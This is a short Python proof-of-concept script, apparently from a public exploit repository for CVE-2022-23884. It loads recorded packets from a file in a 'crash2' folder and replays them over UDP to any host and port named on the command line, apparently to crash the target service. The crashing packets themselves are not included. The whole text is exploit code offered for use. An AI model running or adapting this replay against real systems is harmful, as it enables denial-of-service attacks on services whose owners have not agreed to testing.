# https://github.com/LuckyDogDog/CVE-2022-23884
import marshal
import socket,time,threading,sys
def get_s_sck():
    sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return sk
def replay():
    sk=get_s_sck()
    cont = marshal.load(open("./crash2/purchase.pkt", "rb"))
    for i in cont:
        sk.sendto(i, (sys.argv[1], int(sys.argv[2])))
    sk.close()
replay()
